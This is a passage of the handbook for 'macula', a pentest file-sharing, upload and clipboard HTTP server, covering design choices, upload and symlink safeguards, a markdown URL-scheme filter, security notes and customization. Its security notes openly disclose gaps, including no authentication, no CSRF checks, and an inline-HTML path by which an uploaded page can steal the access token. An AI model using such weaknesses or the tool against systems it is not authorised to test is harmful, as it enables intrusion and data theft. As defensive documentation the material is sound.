- **One `-d` and one `-u`**: two mounts, virtual root at `/` listing both.
- **Two or more** sources: virtual root at `/`, each directory under `/<basename>/`.

The rationale: a single-directory share is by far the most common case; hiding the extra hop avoids pointless clicks. As soon as there's more than one source, a virtual root becomes necessary to disambiguate.

### Mount name collisions

When two mounts would share a name, the second gets `_2`, the third `_3`, and so on. The `-u` directory follows the same rule. There is no warning printed for the rename, it's assumed the user knows which folder they passed twice.

### Upload folder is a normal share

`-u /path` mounts the folder **both** as the destination for uploads **and** as a normal share. Fetching uploaded files back is just a GET on the share, no dedicated download route.

### Nested mounts: longest root wins

If two mounts are nested (`-d /a -d /a/b`), a path under `/a/b` matches both. macula always resolves to the **most specific** mount (longest root path) in `_mount_for`. The URL-prefix resolution in `translate_path` walks the mounts in configuration order and picks the first matching prefix, so a path under a nested mount is looked up inside the outermost mount. For the intended use (`-d` on disjoint directories), the two rules agree; the divergence is a documented edge case.

### Fingerprint algorithm

Auto-refresh uses a single fingerprint algorithm for both the HTML page and the `?stat=1` endpoint: SHA1 over `(rel_path, size, mtime_ns)` for every file, and `rel_path` for every directory. The two callers use the same in-memory tree, so for identical disk state they always produce identical hashes, anything else would cause an infinite reload loop.

`mtime_ns` (nanoseconds since epoch) is used instead of `mtime` because two writes within the same second produce different fingerprints on modern filesystems. It's compatible with older filesystems that only expose second resolution, the value is just `mtime * 10⁹` there, which is still correct, just less precise.

### Single disk pass for HTML render

For HTML pages, the tree is built once and the fingerprint is derived from that same in-memory tree, no second `os.walk`. The `?stat=1` endpoint takes the disk-walk path because it has no tree to reuse. Both paths are equivalent in output.

### Streamed file transfer

Every file download and every generated archive is streamed to the socket in 64 KB chunks. User archives (zip/tgz) are built in a temporary file on disk, then streamed; only source archives, which are always small, are built in RAM. This means peak memory is bounded by a 64 KB chunk regardless of file size, at the cost of temp-file I/O for folder archives.

### Symlink policy

- A symlink whose target is inside **any** configured mount is followed.
- A symlink whose target is outside **every** mount root is ignored during tree building and file serving. This includes symlinks that point to system paths (`/etc`, `/home`) and symlinks that resolve through a chain leading outside.
- A symlink that points to a file or directory served by a **different mount** on the same server is followed, the resolution is per-mount-root, not per-source-directory.
- Uploads refuse to overwrite an existing symlink at the destination (`409 Conflict`) even if it would resolve inside the share.
- Symlink loops in `Path.resolve()` are caught (`OSError` / `RuntimeError` / `ValueError`) and treated as "not resolvable".
- Uploads open the destination with `O_NOFOLLOW` when available, and re-check the final path for a symlink after creating the parent chain. On platforms without `O_NOFOLLOW` the `is_symlink()` check is the only guard acceptable because Windows symlinks require elevated privileges (or Developer Mode).

### Upload safety

- Filenames are sanitised to `[A-Za-z0-9._-]` per segment, then leading and trailing dots/underscores are stripped.
- `".."`, `"."`, and dot-only names become `"download"` at the final step; path segments that are literally `.` or `..` are rejected outright with `400`.
- Absolute POSIX paths (leading `/`) and absolute Windows paths (leading `\` or `C:`) are rejected with `400`.
- Backslashes are normalised to forward slashes for cross-platform paths.
- Symlinks are never overwritten.
- The destination, after resolution, must be inside `<upload_dir>`. Otherwise `400`.
- The request body is streamed in 64 KB chunks and each multipart part is spooled to a `SpooledTemporaryFile` (8 MiB threshold, then disk). Peak RAM is therefore bounded by the spool threshold, not by `--max-upload-size`. Oversized `Content-Length` is still rejected **before** reading the body (`413` + connection close).
- The destination file is opened with `O_NOFOLLOW` where the platform supports it; the destination path is re-checked for symlinks after `mkdir()` to close the parent-swap race.

### Nested upload paths

`?name=a/b/c.txt` creates `<upload_dir>/a/b/c.txt` with `mkdir -p` on the parent chain. Directory creation is per-upload; macula does not create empty directories on its own. Repeating an upload to the same path overwrites the file (last writer wins).

### Archive content

The `source` endpoint ships `macula.py` plus the entire `macula/` package, excluding `__pycache__` and skipping symlinks. `HANDBOOK.md` at the project root is **not** included in the archive, it is served at runtime via the `handbook` endpoint instead.

### Markdown renderer

`macula/markdown.py` is a self-contained, line-based renderer. It supports:

- ATX headings (`#` … `######`) with auto-generated anchor ids
- Paragraphs (soft-wrapped lines joined with a space)
- Fenced code blocks (``` and `~~~`), with optional language class
- Inline code (`` `code` ``)
- Bold (`**x**`, `__x__`) and italic (`*x*`, `_x_`)
- Links `[text](url)`, including in-page anchors `[text](#slug)`
- Unordered lists (`-`, `*`, `+`) with nesting
- Ordered lists (`1.`) with nesting
- Blockquotes (`> text`)
- Horizontal rules (`---`, `***`, `___`)
- Pipe tables with alignment (:---, :---:, ---:), GFM-compatible: outer pipes are optional; the separator row of each column needs at least three dashes
- Link URLs are filtered by scheme: only `http`, `https`, `mailto`, `tel`, `ftp`, `ftps`, fragment-only, and relative URLs are kept. `javascript:`, `data:`, `vbscript:`, `file:` and any other scheme are replaced with `#`. The `rel="noopener"` attribute is added to every generated `<a>`.

It does **not** support: footnotes, task lists, HTML blocks, images, nested emphasis, strikethrough, autolinks, reference links, setext headings, or table separator rows with fewer than 3 dashes (the row degrades to a paragraph).

Text is HTML-escaped before parsing, so the reader cannot inject tags. This is a deliberate trade-off to keep the codebase zero-dependency. If you need more, replace `render_markdown(text) -> str` with any function of the same signature.

### Heading anchors

Every heading gets a stable `id` derived from its text:

- backticks and `*` stripped (other characters are left alone)
- lowercase
- Unicode NFKD, then ASCII-folded (accents removed)
- any character outside `[a-z0-9 _-]` removed
- spaces replaced with `-`
- consecutive dashes are **not** collapsed
- leading and trailing dashes are **kept**
- duplicates suffixed with `-1`, `-2`, `-3`, …

Underscores are preserved, so `snake_case` stays `snake_case`. Double spaces become double dashes.

The slug format is designed to be compatible with the TOC generators shipped by common editors (VS Code Markdown All in One, `markdown-toc`, `doctoc`). Verification of this compatibility is manual: it is not automated as part of the test suite. The list above is the authoritative description of what the code does.

### No auto-generated table of contents

The renderer does **not** synthesise a TOC. If the source document ships its own (as this handbook does), it is rendered as a plain markdown list with working anchor links. This keeps the rendered output identical to what the author wrote and avoids duplicate TOCs.

### Clipboard storage

Clipboard rooms are kept **only in RAM**. Restarting macula wipes them. There is no persistence layer, no file backing, no shared state between processes. This is by design: a pentest tool should not leave lingering state on disk, and the clipboard is ephemeral by nature.

### Clipboard eviction

When `--clipboard-max-rooms`, `--clipboard-max-mb`, or `--clipboard-max-total-mb` is exceeded, the **oldest** rooms are removed (by last-modified timestamp) until the store fits again. This is FIFO, not LRU, a room that was just created but never edited is newer than one that was edited an hour ago.

### Clipboard search uses `re.search`

Both substring and regex modes compile a `re.Pattern` and call `.search()` on each room's text. The substring variant is `re.escape`'d. This avoids a `.lower()` copy of every room's body on every poll, with 200 rooms of 1 MB each, the naive approach would allocate ~200 MB per poll cycle.

### Clipboard preview allocation

The `preview` field returned in the rooms list is computed from the first line only, and the slice is bounded to `60 × 4 = 240` characters before `.strip()`. This prevents a 1 MB single-line room from being duplicated in full just to compute a 60-char preview.

### Clipboard autosave cadence

`CLIPBOARD_AUTOSAVE_MS` (default `1500`) is the debounce interval. On each keystroke, the previous timer is cleared and a new one is scheduled. `Ctrl+Enter` bypasses the debounce. `navigator.sendBeacon` fires on `beforeunload` for edits still pending, this is best-effort and not guaranteed by the browser.

### Clipboard poll preserves cursor

When the selected room is refreshed from the server and the textarea is **not dirty**, the textarea's `selectionStart`, `selectionEnd`, and `scrollTop` are saved and restored around the value replacement. Without this, a poll firing mid-edit would jump the cursor to the end.

### Clipboard inflight serialization

Only one autosave request is in flight at a time. Clicking another room or creating a new one awaits the pending autosave before proceeding. The client tracks the room id and text captured at request time; when the response arrives, it only marks state as saved if the currently selected room is still the same and the textarea content hasn't changed since.

### Clipboard view formats

`?format=raw` requires `&id=N`. Attempting to fetch the whole store as one raw blob is rejected with `400`. This is intentional: raw is meant for scripting on a single room, and a whole-store raw dump would have no clear delimiter semantics.

### `X-Content-Type-Options: nosniff` on every response

Injected by overriding `end_headers()`, so the header appears on **every** response the handler emits: normal bodies, streamed files, redirects, `send_error()` pages and the `204` favicon reply. This prevents MIME sniffing in browsers, which is a small hardening against HTML/SVG uploaded by a target being interpreted as a script. It does **not** prevent inline HTML or SVG from executing when opened directly, see [Security notes](#security-notes).

### `favicon.ico` returns 204

Pages embed an inline SVG favicon via a `data:` URI. `favicon.ico` returns `204 No Content` so browser probes don't show up as 404s in the log.

### HEAD = GET without body

`do_HEAD` sets `_head_only` and delegates to `do_GET`. Every writer checks the flag before `wfile.write()`. This is required for `curl -I`, `nmap`, `ffuf`, and similar tools to work against macula without needing a special case in every response path. The clipboard endpoint is dispatched on both `GET` and `HEAD`, so its status codes are identical for the two verbs.

### 301 preserves query string

A directory request without a trailing slash is redirected with the query string intact:

```
GET /sub?format=json  →  301 Location: /sub/?format=json
```

### Filter prunes empty directories

When positional filters are passed, the tree is built without a depth cut (so descendants are visible to the filter), then pruned of empty directories bottom-up, then truncated to `-D N` if given. This means a filter that matches a file three levels deep still surfaces its parent chain.

### Sort order

Within every directory, sub-directories are listed before files, and each group is sorted case-insensitively by name. This is stable across all renderers.

### `_preview` on single rooms

Single-room JSON omits `preview`. The field was removed because the client never used it and its computation required duplicating the room text. If you need it from the CLI, use `jq -r '.room.text | split("\n")[0][:60]'`.

The docstring in `clipboard.py` reads "First line of `text`, truncated to `limit` chars", matching the code, which returns the first line verbatim (including an empty first line if the room starts with `\n`).

### `human_size`

Sizes are printed as `B`, `K`, `M`, `G`, `T`, and `P` (the last two only in extreme cases). Zero decimals up to `G`, one decimal for `T` and `P`. This matters for the `Max upload` and stat pills; any change here is purely cosmetic.

### Server thread model

`ThreadingTCPServer` with `daemon_threads = True` and `allow_reuse_address = True`. A slow client can hold one thread; there is no connection limit. Sufficient for pentest use, not hardened for public exposure.

### Bind failure rollback

If any bind fails, macula closes every socket it managed to open (`server_close()` on the already-built servers) and calls `sys.exit(1)` before entering the `serve_forever` loop. The already-bound sockets were never `serve_forever`-ed (`_serving` is `False`), so the cleanup path does not try to `shutdown()` them. The process exit is what terminates any daemon thread still alive from a previously bound socket.

### SIGINT during cleanup

The `finally` block installs `SIG_IGN` for `SIGINT` before calling `shutdown()` on any server. A second `^C` during shutdown is silently ignored instead of raising `KeyboardInterrupt` from inside the cleanup and printing a traceback. A single `^C` during the server loop triggers the same `finally` block and prints `[+] macula stopped.` before exiting with status `0`.

### Whitelist is enforced at accept time

`-c IPV4` is checked in `verify_request` before the connection is handed to a handler. Blocked connections are logged as `[!] BLOCKED: Dropped unauthorized connection from <ip>` and immediately closed.

### UI dropdowns built in one place

All dropdown menus (Source, Clipboard, Handbook, Export) are constructed in `macula/renderers.py` by four `_build_*_dropdown()` functions and injected into `page.html` as a single variable each. This means: (1) the layout template holds no menu HTML, (2) adding or changing a menu is one edit, (3) the `if endpoint else ""` logic is Python, not `string.Template`. Every menu uses the same `.dropdown` / `.dropdown-menu` markup with a `.label` mini-heading on top.

### UI stat pills

The stats bar under the header shows:

- **Filter**, the positional filters, or `none`
- **Depth**, `unlimited`, `load on click`, or a number
- **Items**, dirs · files, plural-aware
- **Mounts**, only on the virtual root, count + `share`/`shares`
- **Upload**, only if `-u`, count + `file`/`files`
- **Clipboard**, only if enabled, count + `room`/`rooms`
- **Max upload**, human-readable limit

Every pill has a `title=` tooltip explaining what it means. Pluralisation is centralised in `_plural()`.

### Back-to-top button

Handbook pages, rendered markdown files, and the clipboard UI show a circular `↑` button fixed to the bottom-left. It appears after 300 px of scroll, hides below that, and uses `scrollTo({behavior: 'smooth'})` on click. Pure JS, no library, no scroll listener beyond a passive one.

### Path validation and null bytes

`_safe_resolve` and `_mount_for` reject any path that `Path.resolve()` cannot handle, including paths with embedded null characters (`\x00`). Such requests are returned as `404 Not Found` and do not crash the handler. The `X-Content-Type-Options: nosniff` header is set on every response, including error pages produced by `send_error()`.

### Request body handling

The upload endpoint reads the body of every `POST`, and rejects oversized bodies before reading. The clipboard `create` and `update` actions read the body; the `clear` / `delete` / `clear_all` actions and any malformed action drain the body without parsing it, so a keep-alive connection is not desynchronised. Every response writer catches `BrokenPipeError` and `ConnectionResetError` so a client disconnect mid-write does not produce a traceback.

### No authentication by design

macula has no login. It is meant to be run on a trusted network segment (VPN, host-only interface) for the duration of an engagement. The token protects macula's own endpoints, not the shares.

### No CSRF protection

The upload and clipboard POST endpoints do not check `Origin` or `Referer`, and do not require a secret. This is fine when the server is behind a VPN or a client whitelist, and matches the "tool" scope. Do not expose macula to a hostile network.

### Inline HTML/SVG execution

If a target uploads `evil.html` and you click it, the page is served inline (`Content-Disposition: inline`) and its JavaScript runs in macula's origin. That JavaScript can read `window.MACULA_UPLOAD_TARGET` and `window.MACULA_STAT_URL`, both of which embed the token, and then POST arbitrary uploads. There is no fix that preserves the "view" feature; if you need one, force `Content-Disposition: attachment` for `text/html`, `image/svg+xml`, `application/xml`, and `text/xml`, but this breaks the inline viewer for those types.

---

## Security notes

**macula is a pentest tool, not a hardened production server.**

- **No authentication.** The token protects macula's internal endpoints, not the shares.
- **No rate limiting.** A slow client can hold a thread open.
- **No CSRF protection** on the upload or clipboard POST endpoints.
- **Inline HTML/SVG execution**: see [Design choices](#design-choices). `X-Content-Type-Options: nosniff` is set on every response but that does not stop inline HTML/SVG.
- **Whitelist is IP-only**, behind NAT, everyone shares an IP.
- **Path with embedded null bytes** is rejected with `404` (see [Design choices](#design-choices) → Path validation and null bytes).

Recommended mitigations:

- Run behind a VPN (`-b tun0`) or on a firewalled interface.
- Use `-c <your-ip>` when you know your address.
- Always use a random token (default).
- Don't leave it running longer than needed.
- Disable the clipboard if you don't need it (`--no-clipboard`).

---

## Exit codes

| Code | When |
|---|---|
| `0` | Normal termination after `--version` or `--help`; clean shutdown via `^C` during the server loop. |
| `1` | Any CLI validation failure: bad `--max-upload-size`, `-D` negative, clipboard limits out of range, missing directory, non-writable upload dir, unknown interface, no valid bind addresses, TLS setup failure, `EADDRINUSE` on bind. |
| `130` | `KeyboardInterrupt` during the bind phase (before the server loop starts serving). Standard shell convention for `SIGINT`. |

---

## Project layout

```
.
├── macula.py              # entry point
├── HANDBOOK.md            # this file
└── macula/
    ├── __init__.py        # version, magic constants, token helpers
    ├── __main__.py        # `python3 -m macula`
    ├── cli.py             # argparse + banner + server loop
    ├── clipboard.py       # in-memory clipboard store
    ├── markdown.py        # minimal markdown renderer (no deps)
    ├── renderers.py       # HTML / JSON / text output
    ├── server.py          # HTTP handler + threaded server
    ├── tree.py            # directory tree + fingerprints
    ├── utils.py           # helpers
    └── static/
        ├── app.js         # browser-side tree, search, upload
        ├── clipboard.html # clipboard UI template
        ├── dropzone.html  # upload panel (injected)
        ├── handbook.html  # handbook / markdown reader template
        ├── page.html      # main HTML template
        └── style.css      # all CSS
```

### Mount layout

With `N` directories passed via `-d` (and optionally `-u`):

| N | Layout |
|---|---|
| 0 | Only `~` (`$HOME`) is served at `/`. |
| 1 (no `-u`) | That single directory is served at `/`. |
| 1 (`-u`) | Two mounts: `/<dirname>/` and `/<uploadname>/`, virtual root at `/`. |
| ≥ 2 | Each directory at `/<basename>/`, virtual root at `/`. |

Name collisions: second `foo` becomes `foo_2`, third `foo_3`, etc.

---

## Tuning constants

Every tunable default lives in `macula/__init__.py`. Change once, done.

```python
# Project
REPO_URL = "https://github.com/USERNAME/macula"

# Networking
DEFAULT_PORT       = 8000
DEFAULT_BIND       = "127.0.0.1"
DEFAULT_MAX_UPLOAD = "2G"

# Listing
VALID_FORMATS      = ("html", "json", "text")

# Endpoint suffixes (paths are /{token}/<suffix>)
UPLOAD_SUFFIX    = "upload"
SOURCE_SUFFIX    = "source"
HANDBOOK_SUFFIX  = "handbook.md"
CLIPBOARD_SUFFIX = "clipboard"

# Filename served by the handbook endpoint
HANDBOOK_FILE = "HANDBOOK.md"

# Clipboard
CLIPBOARD_ENABLED         = True      # toggled by --no-clipboard
CLIPBOARD_MAX_ROOMS       = 200
CLIPBOARD_MAX_MB_PER_ROOM = 1
CLIPBOARD_MAX_TOTAL_MB    = 20
CLIPBOARD_POLL_MS         = 3000      # frontend polling cadence
CLIPBOARD_AUTOSAVE_MS     = 1500      # autosave debounce
```

Frontend auto-refresh for the file tree is `AUTO_MS` in `macula/static/app.js` (`15000` ms).

---

## Customization

### Change the source distribution format

Edit `_send_source_zip` / `_send_source_targz` in `macula/server.py`. Both call `_iter_project_files`, which yields `(path, arcname)` pairs. Add entries there to include additional files in the downloaded archive.

### Add a new internal endpoint

1. Add a suffix and a `make_*_endpoint(token)` helper in `macula/__init__.py`.
2. Wire it in `macula/cli.py` where the other endpoints are computed.
3. Add the attribute to `httpd.*` in the server setup loop.
4. Dispatch in `MaculaHandler.do_GET` (before the filesystem fallback). If the endpoint also accepts `POST`, dispatch in `MaculaHandler.do_POST` as well. `do_HEAD` delegates to `do_GET`, so any writer must honour `self._head_only` before calling `self.wfile.write()`, the existing `_send_body` and `_stream_file` already do this, so reusing them is enough.
5. In the handler, drain any pending request body before sending a response that does not read it (use `self._drain_request_body()`), otherwise a keep-alive client can desynchronise the connection.
6. Expose it in the JSON and text renderers via `render_json` / `render_text`.

### Change the fingerprint cadence

`AUTO_MS` in `macula/static/app.js`. Default `15000` ms.

### Change the clipboard cadence

`CLIPBOARD_POLL_MS` and `CLIPBOARD_AUTOSAVE_MS` in `macula/__init__.py`. Both are injected into the clipboard template at render time.

### Replace the markdown renderer

`macula/markdown.py` is self-contained. Its public surface is a single function:

```python
render_markdown(text: str) -> str
```

Return HTML. No configuration object, no AST, swap it for anything that respects the same signature. The `?mode=render` endpoint and the handbook reader both call this function through `renderers.render_handbook_html`.

### Change the branding

- Colors: `--macula`, `--primary`, `--folder`, `--file` in `macula/static/style.css`.
- SVG marks: the `SVG_*` constants in `macula/renderers.py`.
- Favicon: the inline data URI in `macula/static/page.html`, `handbook.html`, and `clipboard.html`.

### Change the version

`__version__` in `macula/__init__.py`. It surfaces in the banner, the footer, `--version`, and every template.

### Change the repo URL

- Permanent: edit `REPO_URL` in `macula/__init__.py`.
- Runtime: pass `--repo-url https://...`.

The constant affects banner, epilog, and `--version`. The flag overrides everything except the two argparse strings (which are evaluated before the flag is parsed).

### Add a CLI flag

Edit the argparse block in `macula/cli.py`, propagate the value to `httpd.*` in the server setup loop, and read it back inside `MaculaHandler` via `getattr(self.server, "<attr>", <default>)`.

---

*macula is zero-dependency by design. Every feature above ships with the standard library alone.*